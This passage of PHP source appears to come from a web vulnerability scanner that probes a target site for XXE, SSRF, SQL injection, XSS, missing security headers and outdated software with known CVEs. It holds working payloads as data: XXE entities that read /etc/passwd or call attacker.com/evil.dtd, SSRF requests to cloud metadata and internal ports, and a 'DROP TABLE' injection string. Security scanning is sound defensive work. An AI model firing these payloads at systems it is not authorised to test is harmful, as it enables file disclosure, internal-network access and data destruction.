        if ($httpCode == 200 && $response) {
            // Check if response contains user-specific data patterns
            $userDataIndicators = [
                'user', 'profile', 'account', 'email', 'phone', 'address',
                'order', 'purchase', 'transaction', 'document', 'file'
            ];
            
            foreach ($userDataIndicators as $indicator) {
                if (stripos($response, $indicator) !== false) {
                    return true;
                }
            }
            
            // Check for JSON responses with user data
            if (strpos($response, '{') === 0 || strpos($response, '[') === 0) {
                $jsonData = json_decode($response, true);
                if ($jsonData && is_array($jsonData)) {
                    $sensitiveKeys = ['email', 'phone', 'name', 'address', 'password', 'token'];
                    foreach ($sensitiveKeys as $key) {
                        if (isset($jsonData[$key])) {
                            return true;
                        }
                    }
                }
            }
        }
        
        return false;
    }

    // private function isIDORVulnerable($testUrl, $testId) {
    //     if (!$this->checkRequestLimit()) {
    //         return false;
    //     }
    //     try {
    //         $ch = curl_init($testUrl);
    //         curl_setopt_array($ch, [
    //             CURLOPT_RETURNTRANSFER => true,
    //             CURLOPT_FOLLOWLOCATION => true,
    //             CURLOPT_TIMEOUT => 10,
    //             CURLOPT_CONNECTTIMEOUT => 5,
    //             CURLOPT_USERAGENT => 'SecurityScanner/2.0'
    //         ]);
            
    //         $response = curl_exec($ch);
    //         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    //         curl_close($ch);
            
    //         // If we get a successful response (not 403, 404, or redirect to login)
    //         if ($httpCode == 200 && $response) {
    //             // Check if response contains user-specific data patterns
    //             $userDataIndicators = [
    //                 'user', 'profile', 'account', 'email', 'phone', 'address',
    //                 'order', 'purchase', 'transaction', 'document', 'file'
    //             ];
                
    //             foreach ($userDataIndicators as $indicator) {
    //                 if (stripos($response, $indicator) !== false) {
    //                     return true;
    //                 }
    //             }
                
    //             // Check for JSON responses with user data
    //             if (strpos($response, '{') === 0 || strpos($response, '[') === 0) {
    //                 $jsonData = json_decode($response, true);
    //                 if ($jsonData && is_array($jsonData)) {
    //                     $sensitiveKeys = ['email', 'phone', 'name', 'address', 'password', 'token'];
    //                     foreach ($sensitiveKeys as $key) {
    //                         if (isset($jsonData[$key])) {
    //                             return true;
    //                         }
    //                     }
    //                 }
    //             }
    //         }
            
    //         return false;
            
    //     } catch (Exception $e) {
    //         return false;
    //     }
    // }

    private function checkRequestLimit() {
        static $requestCount = 0;
        static $startTime = null;
        
        if ($startTime === null) {
            $startTime = microtime(true);
        }
        
        $requestCount++;
        $elapsedTime = microtime(true) - $startTime;
        
        // Maximum 500 requests or 100 seconds total
        if ($requestCount > 100) {
            error_log("VulnerabilityScanner: Request limit exceeded (100 requests)");
            return false;
        }
        
        if ($elapsedTime > 120) { // 2 minutes
            error_log("VulnerabilityScanner: Time limit exceeded (120 seconds)");
            return false;
        }
        
        return true;
    }

    private function testXXEVulnerabilities($url) {
        $this->addTestResult('xxe_test', 'XXE Vulnerability Testing', 'info', 'Testing for XML External Entity (XXE) vulnerabilities');
        
        $xxePayloads = [
            // Basic XXE payloads
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root></root>',
            
            // External entity injection
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            
            // Parameter entity expansion
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><data>test</data>',
            
            // Blind XXE out-of-band
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://'.uniqid().'.burpcollaborator.net">%xxe;]><data>test</data>',
            
            // XXE for SSRF
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
            
            // Local file inclusion
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
            
            // PHP wrapper
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>'
        ];
        
        $vulnerableEndpoints = [];
        
        // Test common XML endpoints
        $xmlEndpoints = [
            '/api/xml',
            '/xmlrpc',
            '/soap',
            '/webservice',
            '/api/soap',
            '/rest/xml',
            '/api/rest/xml'
        ];
        
        foreach ($xmlEndpoints as $endpoint) {
            $testUrl = rtrim($url, '/') . $endpoint;
            
            foreach ($xxePayloads as $payloadIndex => $payload) {
                if ($this->testXXEEndpoint($testUrl, $payload)) {
                    $vulnerableEndpoints[] = $endpoint;
                    $this->addVulnerability([
                        'type' => 'XML External Entity (XXE) Injection',
                        'severity' => 'CRITICAL',
                        'description' => 'XML parser processes external entities allowing file disclosure or SSRF',
                        'impact' => 'File disclosure, server-side request forgery, remote code execution',
                        'remediation' => 'Disable external entity loading in XML parser: libxml_disable_entity_loader(true); or use JSON instead',
                        'cvss_score' => 8.2,
                        'location' => "Endpoint: $endpoint",
                        'evidence' => "XXE payload triggered response at $endpoint",
                        'category' => 'injection'
                    ]);
                    break 2; // Break both loops after first successful test
                }
            }
        }
        
        // Test POST endpoints that might accept XML
        $this->testXXEPostRequests($url);
        
        if (empty($vulnerableEndpoints)) {
            $this->addTestResult('xxe_test', 'XXE Vulnerability Testing', 'success', 'No XXE vulnerabilities detected');
        }
    }

    private function testXXEPostRequests($baseUrl) {
        // Test common endpoints that might accept XML via POST
        $postEndpoints = [
            '/upload',
            '/import',
            '/api/import',
            '/submit',
            '/process'
        ];
        
        $xxePayload = '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>';
        
        foreach ($postEndpoints as $endpoint) {
            $testUrl = rtrim($baseUrl, '/') . $endpoint;
            
            if ($this->testXXEEndpoint($testUrl, $xxePayload)) {
                $this->addVulnerability([
                    'type' => 'XML External Entity (XXE) in POST Endpoint',
                    'severity' => 'CRITICAL',
                    'description' => 'POST endpoint processes XML with external entities enabled',
                    'impact' => 'File disclosure, server-side request forgery',
                    'remediation' => 'Disable external entity processing in XML parser configuration',
                    'cvss_score' => 8.1,
                    'location' => "POST Endpoint: $endpoint",
                    'evidence' => "XXE payload processed via POST request",
                    'category' => 'injection'
                ]);
            }
        }
    }

    private function testXXEEndpoint($url, $payload) {
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/xml',
                    'User-Agent: SecurityScanner/2.0'
                ],
                CURLOPT_TIMEOUT => 10,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            // Check for XXE indicators in response
            if ($httpCode == 200 && $response) {
                $xxeIndicators = [
                    'root:', 'daemon:', 'bin/', '/bin/bash', // Linux file indicators
                    'for 16-bit app support', '[extensions]', // Windows file indicators
                    'base64', 'PD94bWwg', // Base64 encoded content
                    'iis', 'apache', 'nginx', // Server information
                    '169.254.169.254' // AWS metadata
                ];
                
                foreach ($xxeIndicators as $indicator) {
                    if (stripos($response, $indicator) !== false) {
                        return true;
                    }
                }
                
                // Check for error messages that indicate XXE processing
                $errorPatterns = [
                    '/cannot.*resolve.*entity/i',
                    '/access.*denied/i',
                    '/permission.*denied/i',
                    '/entity.*not.*found/i'
                ];
                
                foreach ($errorPatterns as $pattern) {
                    if (preg_match($pattern, $response)) {
                        return true;
                    }
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testSSRFVulnerabilities($url) {
        $this->addTestResult('ssrf_test', 'SSRF Vulnerability Testing', 'info', 'Testing for Server-Side Request Forgery vulnerabilities');
        
        $ssrfPayloads = [
            'http://169.254.169.254/latest/meta-data/', // AWS metadata
            'http://169.254.169.254/latest/user-data/', // AWS user data
            'http://localhost:22/', // SSH port
            'http://127.0.0.1:3306/', // MySQL port
            'http://localhost:5432/', // PostgreSQL port
            'http://127.0.0.1:5984/', // CouchDB port
            'http://localhost:9200/', // Elasticsearch port
            'http://localhost:27017/', // MongoDB port
            'http://[::1]:22/', // IPv6 localhost
            'http://0.0.0.0:22/', // All interfaces
            'file:///etc/passwd', // Local file access
            'gopher://localhost:25/', // Gopher protocol
            'dict://localhost:22/', // Dict protocol
        ];
        
        $vulnerable = false;
        
        foreach ($ssrfPayloads as $payload) {
            $testUrl = $this->buildTestUrl($url, 'url', $payload);
            if ($this->isSSRFVulnerable($testUrl, $payload)) {
                $this->addVulnerability([
                    'type' => 'Server-Side Request Forgery (SSRF)',
                    'severity' => 'HIGH',
                    'description' => 'Application makes requests to internal resources based on user input',
                    'impact' => 'Internal network enumeration, service interaction, metadata exposure',
                    'remediation' => 'Validate and sanitize all URL inputs, use allow lists for domains, disable dangerous URL schemes',
                    'cvss_score' => 7.5,
                    'location' => 'URL parameter',
                    'evidence' => "Potential SSRF with payload: $payload",
                    'category' => 'ssrf'
                ]);
                $vulnerable = true;
                break;
            }
        }
        
        if (!$vulnerable) {
            $this->addTestResult('ssrf_test', 'SSRF Testing', 'success', 'No SSRF vulnerabilities detected');
        }
    }

    private function isSSRFVulnerable($testUrl, $payload) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0',
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200 && $response) {
                // Check for internal service responses
                $internalIndicators = [
                    'instance-id', 'ami-id', 'hostname', // AWS metadata
                    'availability-zone', 'public-keys',
                    'localhost', '127.0.0.1', 'internal',
                    'OpenSSH', 'MySQL', 'PostgreSQL',
                    'SSH-2.0', 'HTTP/1.1', 'ESF-8.0.0', // Elasticsearch
                    'MongoDB', 'CouchDB', 'Redis'
                ];
                
                foreach ($internalIndicators as $indicator) {
                    if (stripos($response, $indicator) !== false) {
                        return true;
                    }
                }
                
                // Check for error messages that indicate internal service access
                $serviceErrors = [
                    '/connection.*refused/i',
                    '/connection.*timeout/i',
                    '/failed to connect/i',
                    '/no route to host/i'
                ];
                
                foreach ($serviceErrors as $pattern) {
                    if (preg_match($pattern, $response)) {
                        return true;
                    }
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function performDetailedSecurityHeadersTest($url) {
    $this->addTestResult('security_headers', 'Security Headers Analysis', 'info', 'Testing all security headers');
    
    $headers = $this->getDetailedHeaders($url);
    
    $securityHeadersConfig = [
        'Content-Security-Policy' => [
            'required' => true,
            'severity' => 'HIGH',
            'cvss' => 6.1,
            'description' => 'Content Security Policy not implemented',
            'impact' => 'No protection against XSS attacks and content injection',
            'remediation' => 'Implement CSP with appropriate directives: default-src \'self\'; script-src \'self\'',
            'test' => function($value) {
                return !empty($value) && strlen($value) > 10;
            }
        ],
        'X-Frame-Options' => [
            'required' => true,
            'severity' => 'MEDIUM',
            'cvss' => 4.9,
            'description' => 'X-Frame-Options header missing or misconfigured',
            'impact' => 'Vulnerable to clickjacking attacks',
            'remediation' => 'Set X-Frame-Options to DENY or SAMEORIGIN',
            'test' => function($value) {
                // FIX: Check if value is not null before strtoupper
                if (empty($value)) return false;
                $upperValue = strtoupper((string)$value);
                return in_array($upperValue, ['DENY', 'SAMEORIGIN']);
            }
        ],
        'Strict-Transport-Security' => [
            'required' => true,
            'severity' => 'HIGH',
            'cvss' => 5.9,
            'description' => 'HTTP Strict Transport Security not implemented',
            'impact' => 'Vulnerable to SSL stripping attacks',
            'remediation' => 'Implement HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
            'test' => function($value) {
                return !empty($value) && strpos((string)$value, 'max-age') !== false;
            }
        ],
        'X-Content-Type-Options' => [
            'required' => true,
            'severity' => 'MEDIUM',
            'cvss' => 4.3,
            'description' => 'X-Content-Type-Options missing or incorrect',
            'impact' => 'Vulnerable to MIME type sniffing attacks',
            'remediation' => 'Set X-Content-Type-Options: nosniff',
            'test' => function($value) {
                // FIX: Cast to string and compare
                return !empty($value) && strtoupper((string)$value) === 'NOSNIFF';
            }
        ],
        'Referrer-Policy' => [
            'required' => false,
            'severity' => 'LOW',
            'cvss' => 3.1,
            'description' => 'Referrer-Policy not implemented',
            'impact' => 'Potential information leakage via Referer header',
            'remediation' => 'Set Referrer-Policy: strict-origin-when-cross-origin',
            'test' => function($value) {
                return !empty($value);
            }
        ]
    ];
    
    foreach ($securityHeadersConfig as $header => $config) {
        $headerValue = $headers[$header] ?? null;
        $testPassed = $config['test']($headerValue);
        
        if (!$testPassed && $config['required']) {
            $this->addVulnerability([
                'type' => "Missing Security Header - $header",
                'severity' => $config['severity'],
                'description' => $config['description'],
                'impact' => $config['impact'],
                'remediation' => $config['remediation'],
                'cvss_score' => $config['cvss'],
                'location' => 'HTTP Response Headers',
                'evidence' => "Header '$header' not found or misconfigured",
                'category' => 'security_headers'
            ]);
        } elseif ($testPassed) {
            $this->addTestResult("header_$header", "$header Check", 'success', "Properly configured: $headerValue");
        }
    }
}
    
    private function analyzeCSPPolicy($cspHeader) {
        $csp = strtolower($cspHeader);
        
        if (strpos($csp, 'unsafe-inline') !== false) {
            $this->addVulnerability([
                'type' => 'CSP Allows Unsafe Inline',
                'severity' => 'MEDIUM',
                'description' => 'Content Security Policy contains unsafe-inline directive',
                'impact' => 'Reduces XSS protection effectiveness',
                'remediation' => 'Remove unsafe-inline and use nonces or hashes instead',
                'cvss_score' => 4.5,
                'location' => 'Content-Security-Policy Header',
                'evidence' => "CSP contains 'unsafe-inline': $cspHeader",
                'category' => 'security_headers'
            ]);
        }
        
        if (strpos($csp, 'unsafe-eval') !== false) {
            $this->addVulnerability([
                'type' => 'CSP Allows Unsafe Eval',
                'severity' => 'MEDIUM',
                'description' => 'Content Security Policy contains unsafe-eval directive',
                'impact' => 'Allows script evaluation which can be dangerous',
                'remediation' => 'Remove unsafe-eval directive',
                'cvss_score' => 4.2,
                'location' => 'Content-Security-Policy Header',
                'evidence' => "CSP contains 'unsafe-eval': $cspHeader",
                'category' => 'security_headers'
            ]);
        }
        
        if (strpos($csp, 'default-src') === false) {
            $this->addVulnerability([
                'type' => 'CSP Missing Default Source',
                'severity' => 'MEDIUM',
                'description' => 'Content Security Policy missing default-src directive',
                'impact' => 'Incomplete CSP coverage',
                'remediation' => 'Add default-src directive to CSP',
                'cvss_score' => 4.0,
                'location' => 'Content-Security-Policy Header',
                'evidence' => "CSP missing default-src directive",
                'category' => 'security_headers'
            ]);
        }
    }

    private function detectFrameworkVersion($framework, $content) {
        $versionPatterns = [
            'wordpress' => '/wordpress\s+(\d+\.\d+\.\d+)/i',
            'joomla' => '/joomla!?\s*(\d+\.\d+\.\d+)/i',
            'drupal' => '/drupal\s+(\d+)/i'
        ];
        
        if (isset($versionPatterns[$framework]) && preg_match($versionPatterns[$framework], $content, $matches)) {
            return $matches[1];
        }
        
        return null;
    }

    private function checkLibraryVulnerabilities($library, $version) {
        $cves = $this->checkTechnologyCVEs($library, $version);
        
        if (!empty($cves)) {
            $cveIds = array_column($cves, 'id');
            $highestSeverity = $this->getHighestSeverity($cves);
            $highestCVSS = $this->getHighestCVSS($cves);
            
            $this->addVulnerability([
                'type' => "Vulnerable $library Version",
                'severity' => $highestSeverity,
                'description' => "Outdated $library version $version with known vulnerabilities",
                'impact' => 'XSS and other client-side vulnerabilities',
                'remediation' => "Upgrade $library to latest secure version",
                'cvss_score' => $highestCVSS,
                'location' => 'JavaScript Library',
                'evidence' => "$library $version - CVEs: " . implode(', ', array_slice($cveIds, 0, 5)),
                'category' => 'outdated_software',
                'cves' => $cveIds
            ]);
        }
    }

    private function getHighestSeverity($cves) {
        $severityOrder = ['CRITICAL' => 4, 'HIGH' => 3, 'MEDIUM' => 2, 'LOW' => 1, 'UNKNOWN' => 0];
        $highest = 'UNKNOWN';
        
        foreach ($cves as $cve) {
            $currentScore = $severityOrder[$cve['severity']] ?? 0;
            $highestScore = $severityOrder[$highest] ?? 0;
            
            if ($currentScore > $highestScore) {
                $highest = $cve['severity'];
            }
        }
        
        return $highest;
    }

    private function getHighestCVSS($cves) {
        $highest = 0.0;
        foreach ($cves as $cve) {
            if ($cve['cvssScore'] > $highest) {
                $highest = $cve['cvssScore'];
            }
        }
        return $highest;
    }

    private function performAdvancedTechnologyDetection($url) {
        $technologies = [];
        $versions = [];
        
        try {
            $content = $this->fetchUrlContent($url);
            $headers = $this->getDetailedHeaders($url);
            
            // 1. Detect from HTML content patterns
            $techPatterns = [
                'WordPress' => [
                    '/wp-content\/|wp-includes\/|wordpress\/|wp-json/i',
                    '/<link[^>]*wp-content/i',
                    '/<script[^>]*wp-includes/i',
                    '/<meta[^>]*name="generator"[^>]*content="WordPress/i'
                ],
                'Joomla' => [
                    '/joomla\/|media\/joomla|com_joomla|Joomla!/i',
                    '/<meta[^>]*name="generator"[^>]*content="Joomla/i'
                ],
                'Drupal' => [
                    '/drupal\/|sites\/all|core\/assets|Drupal/i',
                    '/<meta[^>]*name="generator"[^>]*content="Drupal/i'
                ],
                'Laravel' => [
                    '/laravel\/|csrf-token|mix\.js/i',
                    '/<meta[^>]*name="csrf-token"/i'
                ],
                'React' => [
                    '/react|react-dom|__next|React/i',
                    '/<div[^>]*id="root"/i'
                ],
                'Vue.js' => [
                    '/vue\.js|vuex|v-model|Vue\.js/i',
                    '/<div[^>]*id="app"/i'
                ],
                'Angular' => [
                    '/angular|ng-|zone\.js|Angular/i',
                    '/<app-root>/i'
                ],
                'Bootstrap' => [
                    '/bootstrap[.-]|bootstrap\.css|Bootstrap/i'
                ],
                'jQuery' => [
                    '/jquery[.-]|jquery\.js|jQuery/i'
                ],
                'Font Awesome' => [
                    '/font-awesome|fa-|Font Awesome/i'
                ],
                'PHP' => [
                    '/\.php\?|PHPSESSID|phpinfo|PHP/i'
                ],
                'Apache' => [
                    '/Apache|apache/i'
                ],
                'Nginx' => [
                    '/nginx|Nginx/i'
                ],
                'IIS' => [
                    '/Microsoft-IIS|IIS/i'
                ],
                'MySQL' => [
                    '/MySQL|mysql/i'
                ],
                'MongoDB' => [
                    '/MongoDB|mongodb/i'
                ],
                'Redis' => [
                    '/Redis|redis/i'
                ]
            ];
            
            foreach ($techPatterns as $tech => $patterns) {
                foreach ($patterns as $pattern) {
                    if (preg_match($pattern, $content)) {
                        // Extract version if possible
                        $version = $this->extractVersion($tech, $content, $headers);
                        $techWithVersion = $version ? "$tech $version" : $tech;
                        
                        if (!in_array($techWithVersion, $technologies)) {
                            $technologies[] = $techWithVersion;
                            if ($version) {
                                $versions[$tech] = $version;
                            }
                        }
                        break;
                    }
                }
            }
            
            // 2. Detect from HTTP headers
            if (isset($headers['Server'])) {
                $server = $headers['Server'];
                $technologies[] = "Web Server: $server";
                
                // Extract version from server string
                if (preg_match('/(Apache|Nginx|IIS)[\/\s]*([\d\.]+)/i', $server, $matches)) {
                    $technologies[] = "$matches[1] $matches[2]";
                }
            }
            
            if (isset($headers['X-Powered-By'])) {
                $technologies[] = "Powered By: " . $headers['X-Powered-By'];
            }
            
            if (isset($headers['X-Generator'])) {
                $technologies[] = "Generator: " . $headers['X-Generator'];
            }
            
            // 3. Detect from JavaScript libraries
            $jsLibraries = $this->detectJavaScriptLibraries($content);
            $technologies = array_merge($technologies, $jsLibraries);
            
            // 4. Detect from CSS frameworks
            $cssFrameworks = $this->detectCSSFrameworks($content);
            $technologies = array_merge($technologies, $cssFrameworks);
            
            // 5. Detect from comment patterns
            $commentTech = $this->detectFromComments($content);
            $technologies = array_merge($technologies, $commentTech);
            
            // 6. Check common files for more detection
            $fileTech = $this->checkCommonFiles($url);
            $technologies = array_merge($technologies, $fileTech);
            
            // Remove duplicates and sort
            $technologies = array_unique($technologies);
            sort($technologies);
            
            // Store for CVE checking
            foreach ($versions as $tech => $version) {
                $this->checkFrameworkVulnerabilities($tech, $version);
            }
            
        } catch (Exception $e) {
            $this->addTestResult("tech_detection", "Technology Detection", 'error', $e->getMessage());
            $technologies = ['Error: ' . $e->getMessage()];
        }
        
        return $technologies;
    }

    private function detectCSSFrameworks($content) {
        $frameworks = [];
        $cssPatterns = [
            'Bootstrap CSS' => ['/bootstrap[.-]([\d\.]+)?\.css/i', '/bootstrap\.min\.css/i'],
            'Tailwind CSS' => ['/tailwind[.-]([\d\.]+)?\.css/i', '/tailwindcss/i'],
            'Bulma' => ['/bulma[.-]([\d\.]+)?\.css/i'],
            'Foundation' => ['/foundation[.-]([\d\.]+)?\.css/i'],
            'Materialize' => ['/materialize[.-]([\d\.]+)?\.css/i'],
            'UIKit' => ['/uikit[.-]([\d\.]+)?\.css/i'],
            'Semantic UI' => ['/semantic[.-]([\d\.]+)?\.css/i'],
            'Font Awesome' => ['/font-awesome[.-]([\d\.]+)?\.css/i', '/fa-/i']
        ];
        
        foreach ($cssPatterns as $framework => $patterns) {
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $content, $matches)) {
                    $version = isset($matches[1]) ? $matches[1] : null;
                    $frameworks[] = $version ? "$framework $version" : $framework;
                    break;
                }
            }
        }
        
        return array_unique($frameworks);
    }

    private function detectJavaScriptLibraries($content) {
        $libraries = [];
        $jsPatterns = [
            'jQuery' => ['/jquery[.-]([\d\.]+)?\.js/i', '/jQuery\s+v?([\d\.]+)/i'],
            'React' => ['/react[.-]([\d\.]+)?\.js/i', '/React\s+v?([\d\.]+)/i'],
            'Vue.js' => ['/vue[.-]([\d\.]+)?\.js/i', '/Vue\.js\s+v?([\d\.]+)/i'],
            'Angular' => ['/angular[.-]([\d\.]+)?\.js/i', '/Angular\s+v?([\d\.]+)/i'],
            'Bootstrap JS' => ['/bootstrap[.-]([\d\.]+)?\.js/i'],
            'Popper.js' => ['/popper[.-]([\d\.]+)?\.js/i'],
            'Chart.js' => ['/chart[.-]([\d\.]+)?\.js/i'],
            'Moment.js' => ['/moment[.-]([\d\.]+)?\.js/i'],
            'Lodash' => ['/lodash[.-]([\d\.]+)?\.js/i'],
            'Underscore.js' => ['/underscore[.-]([\d\.]+)?\.js/i'],
            'Axios' => ['/axios[.-]([\d\.]+)?\.js/i'],
            'Alpine.js' => ['/alpine[.-]([\d\.]+)?\.js/i']
        ];
        
        foreach ($jsPatterns as $lib => $patterns) {
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $content, $matches)) {
                    $version = isset($matches[1]) ? $matches[1] : null;
                    $libraries[] = $version ? "$lib $version" : $lib;
                    break;
                }
            }
        }
        
        return array_unique($libraries);
    }

    private function detectFromComments($content) {
        $technologies = [];
        
        // Look for technology hints in comments
        $commentPatterns = [
            '/<!--.*?(WordPress|Joomla|Drupal|Laravel|React|Vue|Angular|Bootstrap|jQuery).*?-->/i',
            '/\/\*.*?(WordPress|Joomla|Drupal|Laravel|React|Vue|Angular|Bootstrap|jQuery).*?\*\//i'
        ];
        
        foreach ($commentPatterns as $pattern) {
            if (preg_match_all($pattern, $content, $matches)) {
                foreach ($matches[1] as $match) {
                    $technologies[] = "Detected in comments: $match";
                }
            }
        }
        
        return array_unique($technologies);
    }

    private function checkCommonFiles($baseUrl) {
        $technologies = [];
        $commonFiles = [
            '/wp-login.php' => 'WordPress',
            '/administrator' => 'Joomla',
            '/user/login' => 'Drupal',
            '/laravel' => 'Laravel',
            '/phpinfo.php' => 'PHP Info',
            '/server-status' => 'Apache Status',
            '/nginx-status' => 'Nginx Status',
            '/robots.txt' => 'Robots.txt',
            '/sitemap.xml' => 'Sitemap'
        ];
        
        foreach ($commonFiles as $file => $tech) {
            $testUrl = rtrim($baseUrl, '/') . $file;
            if ($this->checkUrlExists($testUrl)) {
                $technologies[] = "$tech (found at $file)";
            }
        }
        
        return $technologies;
    }

    private function extractVersion($technology, $content, $headers) {
        $versionPatterns = [
            'WordPress' => [
                '/wordpress.*?(\d+\.\d+\.\d+)/i',
                '/wp-includes\/js\/wp-embed\.js\?ver=([\d\.]+)/i',
                '/<meta[^>]*name="generator"[^>]*content="WordPress ([\d\.]+)"/i'
            ],
            'Joomla' => [
                '/Joomla!.*?(\d+\.\d+\.\d+)/i',
                '/<meta[^>]*name="generator"[^>]*content="Joomla! ([\d\.]+)"/i'
            ],
            'Drupal' => [
                '/Drupal.*?(\d+)/i',
                '/<meta[^>]*name="generator"[^>]*content="Drupal ([\d\.]+)"/i'
            ],
            'jQuery' => [
                '/jquery[.-](\d+\.\d+\.\d+)\.js/i',
                '/jQuery v([\d\.]+)/i'
            ],
            'Bootstrap' => [
                '/bootstrap[.-](\d+\.\d+\.\d+)\./i',
                '/Bootstrap v([\d\.]+)/i'
            ],
            'React' => [
                '/react[.-](\d+\.\d+\.\d+)\./i',
                '/React v([\d\.]+)/i'
            ],
            'PHP' => [
                '/PHP\/([\d\.]+)/i'
            ],
            'Apache' => [
                '/Apache\/([\d\.]+)/i'
            ],
            'Nginx' => [
                '/nginx\/([\d\.]+)/i'
            ]
        ];
        
        if (isset($versionPatterns[$technology])) {
            foreach ($versionPatterns[$technology] as $pattern) {
                if (preg_match($pattern, $content, $matches) || 
                    (isset($headers['X-Powered-By']) && preg_match($pattern, $headers['X-Powered-By'], $matches))) {
                    return $matches[1];
                }
            }
        }
        
        return null;
    }

    private function detectServerTechnologies($url, &$technologies) {
        try {
            $headers = $this->getDetailedHeaders($url);
            
            // Detect server software
            if (isset($headers['Server'])) {
                $server = $headers['Server'];
                $technologies[] = $server;
                
                // Extract version and check for CVEs
                if (preg_match('/(apache|nginx|iis)\/?(\d+\.\d+\.\d+)/i', $server, $matches)) {
                    $serverType = strtolower($matches[1]);
                    $version = $matches[2];
                    $this->checkFrameworkVulnerabilities($serverType, $version);
                }
            }
            
            // Detect PHP
            if (isset($headers['X-Powered-By']) && strpos($headers['X-Powered-By'], 'PHP') !== false) {
                $technologies[] = 'PHP';
                if (preg_match('/PHP\/(\d+\.\d+\.\d+)/', $headers['X-Powered-By'], $matches)) {
                    $version = $matches[1];
                    $this->checkFrameworkVulnerabilities('php', $version);
                }
            }
            
        } catch (Exception $e) {
            // Silently continue if server detection fails
        }
    }

    private function performComprehensiveCVEScan($technologies) {
        $this->addTestResult('cve_scan', 'CVE Vulnerability Scan', 'info', 'Checking all detected technologies for known vulnerabilities');
        
        $uniqueTechnologies = [];
        
        // Extract unique technologies and versions
        foreach ($technologies as $tech) {
            if (preg_match('/([a-zA-Z]+)\s+(\d+\.\d+\.\d+)/', $tech, $matches)) {
                $uniqueTechnologies[$matches[1]] = $matches[2];
            } else {
                $uniqueTechnologies[$tech] = null;
            }
        }
        
        // Check each technology for CVEs
        foreach ($uniqueTechnologies as $tech => $version) {
            $cves = $this->checkTechnologyCVEs($tech, $version);
            
            if (!empty($cves)) {
                $cveCount = count($cves);
                $highestSeverity = $this->getHighestSeverity($cves);
                
                $this->addTestResult("cve_$tech", "CVE Scan - $tech", 'warning', 
                    "Found $cveCount CVEs for $tech" . ($version ? " version $version" : ""));
            } else {
                $this->addTestResult("cve_$tech", "CVE Scan - $tech", 'success', 
                    "No known CVEs found for $tech" . ($version ? " version $version" : ""));
            }
        }
        
        $this->addTestResult('cve_scan', 'CVE Vulnerability Scan', 'success', 'Completed CVE scanning for all detected technologies');
    }

    private function performCommonVulnerabilityTests($url) {
        $this->addTestResult('common_vulns', 'Common Vulnerability Testing', 'info', 'Testing for common web vulnerabilities');
        
        $this->testSQLInjectionVulnerabilities($url);
        $this->testXSSVulnerabilities($url);
        $this->testCSRFVulnerabilities($url);
    }

    private function testSQLInjectionVulnerabilities($url) {
        $testParams = ['id', 'page', 'user', 'category', 'product', 'search', 'q'];
        $sqlPayloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--"
        ];
        
        foreach ($testParams as $param) {
            foreach ($sqlPayloads as $payload) {
                $testUrl = $this->buildTestUrl($url, $param, $payload);
                if ($this->isSQLInjectionVulnerable($testUrl)) {
                    $this->addVulnerability([
                        'type' => 'SQL Injection',
                        'severity' => 'CRITICAL',
                        'description' => 'SQL injection vulnerability detected in parameter',
                        'impact' => 'Complete database compromise, data theft, authentication bypass',
                        'remediation' => 'Use parameterized queries, input validation, and ORM frameworks. Implement WAF rules.',
                        'cvss_score' => 9.8,
                        'location' => "Parameter: $param",
                        'evidence' => "Vulnerable to payload: $payload",
                        'category' => 'injection'
                    ]);
                    return;
                }
            }
        }
        
        $this->addTestResult('sql_injection', 'SQL Injection Testing', 'success', 'No SQL injection vulnerabilities detected');
    }

    private function isSQLInjectionVulnerable($testUrl) {
        try {
            $content = $this->fetchUrlContent($testUrl);
            
            $sqlErrors = [
                'mysql_fetch_array', 'mysqli_fetch_array', 'pg_fetch_array',
                'SQL syntax', 'MySQL server', 'PostgreSQL', 'ORA-',
                'Microsoft OLE DB', 'ODBC Driver', 'Unclosed quotation mark'
            ];
            
            foreach ($sqlErrors as $error) {
                if (stripos($content, $error) !== false) {
                    return true;
                }
            }
            
            return false;
        } catch (Exception $e) {
            return false;
        }
    }

    private function testXSSVulnerabilities($url) {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '" onmouseover="alert(1)'
        ];
        
        foreach ($xssPayloads as $payload) {
            $testUrl = $this->buildTestUrl($url, 'test', $payload);
